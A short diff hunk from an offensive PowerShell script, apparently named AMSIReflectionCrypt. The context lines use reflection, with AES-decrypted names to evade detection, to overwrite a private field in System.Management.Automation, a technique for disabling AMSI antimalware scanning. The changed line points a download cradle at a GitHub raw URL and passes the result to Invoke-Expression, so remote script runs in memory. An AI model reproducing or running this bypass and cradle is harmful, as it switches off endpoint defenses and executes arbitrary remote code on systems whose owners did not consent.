@@ -52,5 +52,5 @@ $decryptedString2 = Decrypt-StringAES128 -EncryptedText $encryptedString2 -Key $
 [Ref].Assembly.GetType('System.Management.Automation.'+$decryptedString1).GetField($decryptedString2,'NonPublic,Static').SetValue($repalcement1,$repalcement2)
 
 #Change this to execute desierd command freely (Only in memory execution in running PS proccess)
-$scriptContent = Invoke-WebRequest -Uri http://URL/TEST.ps1 -UseBasicParsing
+$scriptContent = Invoke-WebRequest -Uri https://raw.githubusercontent.com/M0M3NTUM44/AMSIReflectionCrypt/main/TestScript.ps1 -UseBasicParsing
 Invoke-Expression -Command $scriptContent
